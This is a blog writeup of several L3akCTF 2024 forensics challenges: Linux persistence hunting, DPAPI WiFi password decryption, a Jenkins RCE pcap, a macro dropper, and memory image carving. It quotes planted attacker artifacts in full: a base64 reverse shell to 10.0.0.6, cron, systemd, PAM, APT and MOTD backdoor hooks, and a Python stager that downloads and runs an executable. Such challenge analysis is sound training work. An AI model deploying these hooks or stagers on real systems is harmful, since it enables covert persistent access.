This is a writeup for some forensics challenges from L3akCTF 2024. Not gonna lie, one of the best CTFs this year where there were many unique challenges to play. Shame I had little time to enjoy the CTF due to having a cybercamp right on the CTF day. I also won the writeup contest with a $25 prize!

## HoldOnTight [Forensics]
Question: Hacking is all about persistence

Flag: `L3AK{C4n7_570p_w0n7_570p_p3rs1s7}`

We are given a Linux artifact to investigate, specifically the `etc` directory. The challenge also mentioned that we should be looking for 8 mini flags related to persistence in Linux systems to obtain the real flag. Here are some good references to understand the methods of Linux persistence:

1. [Linux - Persistence](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/)
2. [The Art Of Linux Persistence](https://hadess.io/the-art-of-linux-persistence/)
3. [Hunting for Persistence in Linux](https://pberba.github.io/security/2021/11/22/linux-threat-hunting-for-persistence-sysmon-auditd-webshell/)

```
└─$ nc 35.229.44.203 3666
Welcome to the ultra-realistic Flag Finder Simulation!
A stealthy hacker has compromised this system and deployed 8 cunning persistence mechanisms.
Your mission, should you choose to accept it, involves the /etc directory, a known haven for configuration treachery.
Each mechanism is cleverly referencing /tmp/backdoor.sh – a nefarious script, no doubt.
Alongside each persistence mechanism, a flag is concealed. Secure all 8 to halt the hacker’s scheme.
Report back with each flag as you uncover them. Each mini flag has L3ak{} format.
Remember: After securing the 8 mini flags, the ultimate flag shall unveil itself.
Gear up, remain vigilant, and good luck!

Flags found: 0/8.

Submit a mini flag:
```

### Flag 1

So the first thing to check was the cron jobs located in `/etc/crontab`. Inside it, the 1st flag can be obtained as `L3ak{Cr0n5_50_C71ch3}`

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 * * * * root /tm'p/b'ac'kd'oor.sh
#L'3a'k{Cr0n5'_50'_C71'ch3}'
```

### Flag 2

Next, another common location for persistence was `/etc/systemd/system` which lists the services that trigger on boot time. A malicious service called `backdoor.service` was running a reverse shell called `backdoor.sh` (this will come in handy later). Inside it was the 2nd flag reversed as `L3ak{53rv1c3_@nd_T1m3r}`.

```
[Unit]
Description=Malware Service Example
After=network.target

[Service]
Type=simple
ExecStart=/tmp/backdoor.sh
Restart=on-failure
User=root #}r3m1T_dn@_3c1vr35{ka3L

[Install]
WantedBy=multi-user.target
```

With the name of the reverse shell, grepping it shows that it was utilized in other files.

```
└─$ grep -r "backdoor.sh" *
pam.d/sudo:session optional pam_exec.so /tmp/backdoor.sh
systemd/system/backdoor.service:ExecStart=/tmp/backdoor.sh
```

### Flag 3

Checking out `/etc/pam.d`, the 3rd flag can be obtained as `L3ak{5up3r_5h311_u53r}`.

```
#%PAM-1.0

# Set up user limits from /etc/security/limits.conf.
session    required   pam_limits.so

session    required   pam_env.so readenv=1 user_readenv=0
session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0

# CantStopWontStop
session optional pam_exec.so /tmp/backdoor.sh

#L#3#a#k#{#5#u#p#3#r#_#5#h#3#1#1#_#u#5#3#r#}
@include common-auth
@include common-account
@include common-session-noninteractive
```

### Flag 4

Another persistence method was 'Message of the Day backdooring' located in `/etc/update-motd.d/` being another common location for persistence. In the directory, a file called `00-header` had the 4th flag encoded in hex `L3ak{5h311_0f_7h3_D4y}`

```

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
	# Fall back to using the very slow lsb_release utility
	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

echo '2f746d702f6261636b646f6f722e73682026' | xxd -r -p | bash
# echo '4c33616b7b35683331315f30665f3768335f4434797d0a' | xxd -r -p
```

### Flag 5

Reading the blogs, the `/etc/rc.local` was another potential location for persistence. Analyzing the file, it seems to be running a bash script that creates the `backdoor.sh` reverse shell. One of the script comments show the 5th flag encoded in base64 as `L3ak{rc_l0c4l_0n_b00t}`.

```
#!/bin/bash

ENCODED_ArcaneGate_PATH="L3RtcC9iYWNrZG9vci5zaA=="
ArcaneGate_PATH=$(echo "$ENCODED_ArcaneGate_PATH" | base64 --decode)
ArcaneGate_BASE64='IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC42LzEyMzQgMD4mMQo='

# Check if the ArcaneGate script exists, if not, recreate it from the Base64 string
if [ ! -f "$ArcaneGate_PATH" ]; then
    echo "ArcaneGate script not found, recreating..."
    echo "$ArcaneGate_BASE64" | base64 --decode > "$ArcaneGate_PATH"
    chmod +x "$ArcaneGate_PATH"
fi

# The Specter that Steers Your Spirit
## In the shadowed alcoves of ancient libraries where the whispers of the past linger like morning fog,
## there lies a tome, bound not in leather but in the mysteries of the ether itself.
## The first chapter, "The Specter that Steers Your Spirit," reveals how one may
## summon and commune with the ghostly essences that drift through the veils of our world. 
## TDNha3tyY19sMGM0bF8wbl9iMDB0fQ==

# Execute the ArcaneGate script
"$ArcaneGate_PATH"

exit 0
```

### Flag 6

The blogs mentioned 'APT backdooring', a persistence method which exploits the APT package manager located in `/etc/apt/apt.conf.d/`. Within the directory, a file called `100holdon` had the 6th flag encoded in base64 `L3ak{4p7_In57411_5h311}`.

```
#TDNha3s0cDdfSW41NzQxMV81aDMxMX0=
DPKG::Post-Invoke {"file=$(echo 'YmFja2Rvb3Iuc2g='|base64 -d); echo 'IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC42LzEyMzQgMD4mMQo=' |base64 -d > /tmp/$file;chmod +x /tmp/$file;/tmp/$file";};
```

### Flag 7

The blogs also mentioned `/etc/init.d/` being a common location for persistence. In the directory, a script called `stillhere.sh` can be found which seems to be running some encrypted payload.

```
#!/bin/bash
### BEGIN INIT INFO
# Provides:          mysticportal
# Required-Start:    $network
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Starts mysticportal
### END INIT INFO

# Function to intreprt messege from the other side
decode_payload() {
    local ENCHANTED=$1
    local i=5
    local payload=""
    while [ $i -lt ${#ENCHANTED} ]; do
        payload="${payload}${ENCHANTED:$i:1}"
        i=$((i+6))
    done
    echo "$payload"
}

# ENCHANTED strings
ENCHANTED_PATH="MZolj/onNzUtGEMrLmZjjrgprmKwL/xcUclbzQqpeagLsHYcnBeuNkTWiLaduoxKGoLdmsRoNsrdDrjCksD.nFFiksEAYUQhOHsOK"
ENCHANTED_STRING="pfXya/kxqlGbKSPOdikkkUFneWGvk/ATUHObOIgGWaBKYZOsEXWVghZSygL nAIBf-UlMDeiMasOY hwnXE>pbkdm&CJjQK ZULrp/IwnjWdJkTMEePmysevNjfCB/JlMRvtNFdlKciUeGmpMJJxq/AEacj1ApwVV0vQaJr.qQhHU0hmDRa.ihgtX0tsiBd.kawOW6Ekxfl/XwTlz1bRFlJ2XiOHY3ujqyy4QrLBa sQwaF0EQcvD>LpYku&Fyakx1shVgW"

# Decode the ENCHANTED path and script
MYSTICPORTAL_PATH=$(decode_payload "$ENCHANTED_PATH")
MYSTICPORTAL_SCRIPT=$(decode_payload "$ENCHANTED_STRING")

start() {
    echo "Starting mysticportal service..."
    if [ ! -f "$MYSTICPORTAL_PATH" ]; then
        echo "MYSTICPORTAL script not found, recreating..."
        echo "$MYSTICPORTAL_SCRIPT" > "$MYSTICPORTAL_PATH"
        chmod +x "$MYSTICPORTAL_PATH"
    fi
    # Start the MYSTICPORTAL script or service
    "$MYSTICPORTAL_PATH"
}

stop() {
    echo "Stopping MYSTICPORTAL service..."
    # Code to stop the MYSTICPORTAL service
}

case "$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    *)
        echo "Usage: /etc/init.d/MYSTICPORTAL {start|stop}"
        exit 1
        ;;
esac

exit 0
```

However, the decode function is literally on top of the script so we can just utilize the function to decrypt the payload and obtain the 7th flag `L3ak{initd_2_b0075}`.

```
#!/bin/bash

# Function to interpret message from the other side
decode_payload() {
    local ENCHANTED=$1
    local i=5
    local payload=""
    while [ $i -lt ${#ENCHANTED} ]; do
        payload="${payload}${ENCHANTED:$i:1}"
        i=$((i+6))
    done
    echo "$payload"
}

ENCRYPTED_STRING="sJddrLOwQzD3SwoKPavkMSxkXsAXn{CvzIEiaRxQCnkMjFZiSIjBAtkUwvbdPMZbW_udhQT2inbJn_VLZtRbJPTCm0gsJDF0yUiZi7paJvr5giIKI}DScGa"
DECRYPTED_STRING=$(decode_payload "$ENCRYPTED_STRING")

echo "Decrypted String: $DECRYPTED_STRING"
```

### Flag 8

Running out of ideas, I did a gamer move and grepped the hex values of `L3ak` to find some easy hits. Guess what, it worked and the 8th flag can be found at `/etc/logrotate.d/rsyslog/`. 

```
└─$ grep -r "4c33616b" *   
logrotate.d/rsyslog:                # Regular maintenance script version 4c33616b7b3130675f376834375f35683331317d
update-motd.d/00-header:# echo '4c33616b7b35683331315f30665f3768335f4434797d0a' | xxd -r -p
```

In the `rsyslog` file, the 8th flag can be found encoded in hex `L3ak{10g_7h47_5h311}`.

```

}
```

### Final flag

With all the mini flags, the real flag can be obtained.

## Do It Dynamically [Forensics]
Question: Dynamic FOR THE WIN!

Flag: `L3AK{L34rN_2_L1573N_2_6H0575}`

We are given a suspicious program to investigate. This challenge was solved by my rev teammate so the method was obviously gonna be unintended as it revolves around decompiling and debugging. The intended method was already shown by the author himself [here](https://github.com/L3AK-TEAM/L3akCTF-2024-public/blob/main/forensics/Do-It-Dynamically/solution/Do%20It%20Dynamically%20Walkthrough.pdf).

Analyzing the program on IDA, a suspiciously named function can be found that contains some decoding.

![do3](/assets/posts/l3akctf2024/do3.png)

In x64dbg, we can go to the `Entry Point` and start from there.

![do1](/assets/posts/l3akctf2024/do1.png)

Then, we can  of the `Entry Point` using the address of the suspicious function `50563B1E29385221`

![do2](/assets/posts/l3akctf2024/do2.png)

![do4](/assets/posts/l3akctf2024/do4.png)

![do8](/assets/posts/l3akctf2024/do8.png)

Double clicking the constant, it will lead us to the function for further debugging. Scrolling up, notice the `push rbp`. Set a new origin (RIP) here and place a breakpoint on the `call my_cursed_executable.7FF70F681596`.

![do5](/assets/posts/l3akctf2024/do5.png)

Running the program, it should stop at the breakpoint. Then, right click on the value of `RDX` to follow it in dump.

![do6](/assets/posts/l3akctf2024/do6.png)

Finally, just `Step Over` and the flag should be in the dump.

![do7](/assets/posts/l3akctf2024/do7.png)

## AiR [Forensics]
Question: Could you help me analyze and find out the WiFi password this person connected to is?

Flag: `L3AK{BL0b_D3crypt1n9_1s_n0_n3w_t0_u_r1ght?}`

We are given a Windows drive to investigate. Researching online about WiFi passwords stored in a Windows system, I stumbled upon this [post](https://answers.microsoft.com/en-us/windows/forum/all/where-are-the-passwords-of-my-wi-fi-networks-saved/5170ec32-92f9-4187-813f-478e7d6dba76) that mentioned WiFi information being stored under `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces[Interface Guid]`. Checking the folder, the password can be found in a XML file. However, the password (keyMaterial) seems to be encrypted.

![air1](/assets/posts/l3akctf2024/air1.png)

Researching online about it, I stumbled upon this [post](https://superuser.com/questions/1433261/how-does-windows-7-8-10-store-and-protect-wifi-password) that mentioned about passwords in Windows being encrypted and decrypted using Data Protection API (DPAPI). At this point, I was stuck and had not enough time to solve it before the CTF ended, but I attempted it right after nonetheless. Reading more about DPAPI, I stumbled upon this [blog](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28) that goes very in-depth in explaining DPAPI, so I will not explain much about it. But basically, a User master key is created and encrypted with user's password, and it is stored in `%APPDATA%/Microsoft/Protect/` while System's master keys are stored in `%WINDIR%/System32/Microsoft/Protect` and used for decrypting DPAPI blobs, protected under a local system account. All the DPAPI blobs created with the CRYPTPROTECT_LOCAL_MACHINE flag set in the CryptProtectData function are protected with the System's master keys.

![air4](/assets/posts/l3akctf2024/air4.png)

Hence, by using Nirsoft [DataProtectionDecryptor](https://www.nirsoft.net/utils/dpapi_data_decryptor.html), we can decrypt any DPAPI data stored on external drive by taking the DPAPI blobs in Protect and the specific registry hives (SYSTEM and SECURITY). Why SYSTEM and SECURITY hives? Since System master keys are not protected by any user passwords, it is secured by the DPAPI_SYSTEM LSA Secret which is stored in the registry under `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets`. This secret is encrypted using the LsaKey derived from the BootKey (or SysKey) which is stored in the Windows SYSTEM registry hive. Shoutout to the author @Nex0 for explaining this part.

![air2](/assets/posts/l3akctf2024/air2.png)

After setting the appropriate configurations and paths for the tool, the flag can be obtained.

![air3](/assets/posts/l3akctf2024/air3.png)

## Impostor [Forensics]
Question: We have detected some anomalies in the network traffic. It's very likely that this is the result of an attack that we are unaware of. Could you help us investigate what happened? If this is indeed an attack, what has the attacker obtained?

Flag: `L3AK{J3nk1n$_1s_0n_3dgE_30d84d801b2947f1bd2faae4fdcbb926}`

We are given a `auth.log` file and pcap file to investigate. Analyzing the pcap, the TCP streams show the attacker performing an RCE attack using jenkins-cli. Researching more about this, I stumbled upon this [blog](https://www.jenkins.io/security/advisory/2024-01-24/) that mentioned something about a vulnerability that exploits the `@` character. Near the first tcp stream shows several WebSocket packets being sent across, this protocol basically just allows bidirectional, streaming communication over an HTTP(S) port.

![jenkins1](/assets/posts/l3akctf2024/jenkins1.png)

Analyzing the WebSocket streams, we can see the attacker enumerating important files like `/etc/passwd`, `/var/lib/jenkins/secrets/master.key` and `/var/lib/jenkins/credentials.xml`. The last stream shows a part of the flag as `1s_0n_3dg`.

![jenkins2](/assets/posts/l3akctf2024/jenkins2.png)

Ok now to investigate the `auth.log` file which contains logs on user logins and authentication mechanisms. The starting logs show brute force attempts on a Jenkins account with the username `sparkle`.

However, near the end of the logs show that the attacker gaining access to the Jenkins account and has downloaded malicious files to the system using jenkins-cli. Additionally, it seems that the attacker encoded the `/var/lib/jenkins/secrets/hudson.util.Secret` file in base64. This information might come in useful later so take note of it.

Going back to the pcap, the malicious file `data.bin` can be extracted via HTTP objects.

![jenkins3](/assets/posts/l3akctf2024/jenkins3.png)

The `data.bin` file shows a base58 encoded string. Decoding it shows a cron job where the job name was another part of the flag encoded in base64 `E_30d84d801b2947f1bd2faae4fdcbb926}`.

```

(crontab -l 2>/dev/null; echo "$cron_schedule $script_path # $job_name") | crontab -
```

Finding the last part of the flag was tough, but going through the TCP and WebSocket streams again, I noticed the `credential.xml` file stores the encrypted user password that might be the flag.

![jenkins5](/assets/posts/l3akctf2024/jenkins5.png)

Doing research on cracking Jenkins passwords, I found this [tool](https://github.com/tarvitz/jenkins-utils) that helps decrypt any Jenkins password as long as a `master key` and `hudson.util.Secret` is supplied. Funnily enough, the `master key` can be easily obtained in a WebSocket stream as the attacker already enumerated for it. 

![jenkins6](/assets/posts/l3akctf2024/jenkins6.png)

The base64 encoded `hudson.util.Secret` file can also be obtained at TCP stream 55. Remember to decode and redownload the new `hudson.util.Secret` file.

![jenkins4](/assets/posts/l3akctf2024/jenkins4.png)

![jenkins7](/assets/posts/l3akctf2024/jenkins7.png)

Finally, the password was succesfully decrypted and the final part of the flag can be obtained as `L3AK{J3nk1n$_`.

## The Spy [Forensics]
Question: During our educational course, one of our students found leaked data, but he does not know how it happened. Are you able to recover what was stolen?

Flag: `L3AK{D1sc0rd_WebH00ks_4re_C001}`

We are given a memory dump to investigate. Reading the scenario, it seems that certain data or files were leaked by a student. Analyzing the proces tree, a suspicious process can be found near the end of the list.

```

```

The process seems to be related to LibreOffice. So by filtering for `.doc` and `.docx` files when performing filescan, a suspicious doc file can be obtained.

```
└─$ python3 vol.py -f ~/Desktop/sharedfolder/L3akCTF/The\ Spy/memdump.mem -o ~/Desktop windows.filescan | grep -E '\.doc'

0x7fd18ef0      \Users\Abdelrhman\Downloads\Cyber Security and Computer Forensics BSc(Hons) 2021-22.doc 128
```

Bingo! Now to dump the malicious file and analyze it. Since it is a doc file, I suspect that it might be related to Macros. Using oledump, a malicious macro can be obtained.

Thankfully, the macro was easy to understand. It seems that it was downloading and running a Python script called `pp.py` from a remote server in the specified path.

It also seems that the remote server URL was encoded in hex and ROT13. Decoding it, we can proceed to the next step which was to analyze the Python script stored in the Google Drive.

![spy1](/assets/posts/l3akctf2024/spy1.png)

```
import os
import requests

def download_file_from_google_drive(file_id, destination):
    URL = "https://docs.google.com/uc?export=download"

    session = requests.Session()

    response = session.get(URL, params={'id': file_id}, stream=True)
    token = get_confirm_token(response)

    if token:
        params = {'id': file_id, 'confirm': token}
        response = session.get(URL, params=params, stream=True)

    save_response_content(response, destination)

def get_confirm_token(response):
    for key, value in response.cookies.items():
        if key.startswith('download_warning'):
            return value
    return None

def save_response_content(response, destination):
    CHUNK_SIZE = 32768

    with open(destination, "wb") as f:
        for chunk in response.iter_content(CHUNK_SIZE):
            if chunk:
                f.write(chunk)

def hex_to_binary(hex_str):
    return bytes.fromhex(hex_str)

def save_binary_to_file(binary_data, file_path):
    with open(file_path, 'wb') as file:
        file.write(binary_data)

def reverse_hex_conversion(file_path, output_file):
    with open(file_path, 'r') as file:
        hex_content = file.read().strip()
    binary_data = hex_to_binary(hex_content)
    save_binary_to_file(binary_data, output_file)

def run_retrieved_file(file_path):
    os.system(file_path)

if __name__ == "__main__":
    # Download the file and save it as file_hex.txt
    file_id = "1lTEbD37UC7B7tIRoAEQ1YK6niLQHGZt0"
    input_file = "file_hex.txt"
    download_file_from_google_drive(file_id, input_file)
    
    # Convert hex to binary and save it as L3AK.exe
    output_file = "L3AK.exe"  
    reverse_hex_conversion(input_file, output_file)
    
    # Execute the retrieved file
    run_retrieved_file(output_file)
    
    print("File retrieved and executed as L3AK.exe")
```

The Python script seems to download another hex encoded file from Google Drive using the id `1lTEbD37UC7B7tIRoAEQ1YK6niLQHGZt0`. So by editing the URL to the file id, the hex encoded file can be obtained. 

![spy2](/assets/posts/l3akctf2024/spy2.png)

Downloading and decoding it shows that it was a malicious executable.

Analyzing the malware on VirusTotal, it shows that the malware was packed with `PyInstaller`. So by using [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor), the malware can be unpacked.

So I strings the file and found a suspicious Discord webhook URL.

Below the URL seems to be a base64 encoded string. Decoding it provides a Discord server invite link. The flag is located in the server. PS: One of the best forensics challenge I've done this year imo

Edit: The decompiler [pycdc](https://github.com/zrax/pycdc) can help decompile the pyc file properly.

## Pixelated 🧃 [Forensics]
Question: awk ? grep ? sed ? always forget the order on those, well anyway have fun!

Flag: `L3AK{p1x3l_p3rfect!}`

We are given another memory dump to investigate. Analyzing the process tree, the MS paint process seems to be oddly running alone near the end of the list. However, after dumping the process, I had no idea what to do next. Thankfully, the author gave a small nudge to me mentioning that we actually had a discussion about this kind of challenge in another CTF previously. I was baffled and straight up remembered about the method of visualizing raw data. Here is a good [reference](https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html) about this whole method.

By dumping the process and renaming the extension from `.dmp` to `.data`, the process can actually be visualized on GIMP as long you have the right width and height (yes its basically trial and error). After several minutes, I managed to get a hit on a part of the MS paint process.

After awhile, I noticed an easy way to determine where the flag might be. If you use `RGB` and look around the starting parts, random colorized pixels can be found when moving the offset. So you can go to any of the colorized pixels and set the appropriate width and height to obtain the flag in cleartext.

By using `RGB565 Big Endian` and width 1624, the flag can be obtained.

Fun fact: I accidentally found a QR code that wasn't even part of the challenge. Sorry @0x157 kekW!
